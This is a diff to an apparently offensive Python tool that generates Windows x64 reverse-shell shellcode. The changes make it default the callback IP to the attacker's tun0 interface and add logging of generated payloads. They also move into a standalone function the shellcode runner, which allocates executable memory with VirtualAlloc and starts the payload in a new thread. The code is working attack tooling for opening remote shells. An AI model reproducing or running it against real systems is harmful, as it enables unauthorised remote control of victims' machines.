@@ -1,16 +1,50 @@
+import psutil
 import ctypes
 import struct
+import socket
 import argparse
+import datetime
 from keystone import Ks, KS_MODE_64, KS_ARCH_X86
 
 from code import CODE
 
 
+def get_ip_address(preferred_interface="tun0"):
+    # Get all network interfaces and their addresses
+    interfaces = psutil.net_if_addrs()
+
+    # Check for the preferred interface first
+    if preferred_interface in interfaces:
+        for addr in interfaces[preferred_interface]:
+            if addr.family == socket.AF_INET and addr.address != "127.0.0.1":
+                return addr.address
+
+    # If the preferred interface is not available, find the first IPv4 address
+    for interface, addresses in interfaces.items():
+        for addr in addresses:
+            if addr.family == socket.AF_INET and addr.address != "127.0.0.1":
+                return addr.address
+
+    # If no IPv4 address is found
+    return None
+
+
 def parse_args():
+    tun_ip = get_ip_address()
     parser = argparse.ArgumentParser(description="Dynamically generate Windows x64 reverse shell.")
-    parser.add_argument(
-        "--ip", "-i", required=True, dest="ip", help="The listening IP address, default value is 192.168.0.45"
-    )
+    if tun_ip:
+        parser.add_argument(
+            "--ip",
+            "-i",
+            required=False,
+            dest="ip",
+            default=tun_ip,
+            help="The listening IP address, default value is %s" % tun_ip,
+        )
+    else:
+        parser.add_argument(
+            "--ip", "-i", required=True, dest="ip", help="The listening IP address, default value is 192.168.0.45"
+        )
     parser.add_argument(
         "--port", "-p", required=False, default=443, dest="port", help="The local listening port, default value is 443"
     )
@@ -48,20 +82,9 @@ def parse_args():
         help="Whether to execution generated shellcode? True/False",
     )
     parser.add_argument(
-        "--save",
-        "-s",
-        required=False,
-        default=False,
-        dest="save",
-        action="store_true",
-        help="Whether to save the generated shellcode to a bin file, True/False",
-    )
-    parser.add_argument(
-        "--output",
-        "-o",
-        required=False,
+        "output",
+        nargs="?",
         default="",
-        dest="output",
         help="If choose to save the shellcode to file, the desired location.",
     )
 
@@ -130,7 +153,7 @@ def gen_shellcode(ip, port, shell_type):
     return shellcode, encoding
 
 
-def output_shellcode(shellcode, lan, encoding, var, code_exec, save, output):
+def output_shellcode(shellcode, lan, encoding, var, code_exec, output):
     lan = lan.lower()
     counter = 0
 
@@ -182,27 +205,7 @@ def output_shellcode(shellcode, lan, encoding, var, code_exec, save, output):
         print("Unsupported language! Exiting...")
         exit()
 
-    if exec is True:
-        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
-        ptr = ctypes.windll.kernel32.VirtualAlloc(
-            ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)
-        )
-
-        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
-        print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
-        ht = ctypes.windll.kernel32.CreateThread(
-            ctypes.c_int(0),
-            ctypes.c_int(0),
-            ctypes.c_uint64(ptr),
-            ctypes.c_int(0),
-            ctypes.c_int(0),
-            ctypes.pointer(ctypes.c_int(0)),
-        )
-
-        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
-
-    if save is True:
+    if output:
         try:
             with open(output, "wb") as f:
                 f.write(shellcode)
@@ -211,8 +214,35 @@ def output_shellcode(shellcode, lan, encoding, var, code_exec, save, output):
             print(e)
 
 
+def exec(shellcode):
+    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+    ptr = ctypes.windll.kernel32.VirtualAlloc(
+        ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)
+    )
+
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
+    print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
+    ht = ctypes.windll.kernel32.CreateThread(
+        ctypes.c_int(0),
+        ctypes.c_int(0),
+        ctypes.c_uint64(ptr),
+        ctypes.c_int(0),
+        ctypes.c_int(0),
+        ctypes.pointer(ctypes.c_int(0)),
+    )
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
+
+def write_log(output, ip, port):
+    # This helps me keep track how a payload was generated
+    now = datetime.datetime.now()
+    with open("mshell.log", "a", encoding="utf-8") as f:
+        f.write(f"[{now.strftime('%m-%d-%Y %H:%M:%S')}] {output} - {ip}:{port}\n")
+
+
 def main(args):
-    print_banner()
     print("[+]Shellcode Settings:")
     print("******** IP Address: " + args.ip)
     print("******** Listening Port: " + str(args.port))
@@ -220,9 +250,13 @@ def main(args):
     print("******** Shellcode array variable name: " + args.var)
     print("******** Shell: " + args.shell_type)
     print("******** Shellcode Execution: " + str(args.code_exec))
-    print("******** Save Shellcode to file: " + str(args.save) + "\n\n")
+    print("******** Output: " + args.output)
     shellcode, encoding = gen_shellcode(args.ip, args.port, args.shell_type)
-    output_shellcode(shellcode, args.lan, encoding, args.var, args.code_exec, args.save, args.output)
+    output_shellcode(shellcode, args.lan, encoding, args.var, args.code_exec, args.output)
+    if args.output:
+        write_log(args.output, args.ip, args.port)
+    if args.code_exec:
+        exec(shellcode)
 
 
 if __name__ == "__main__":
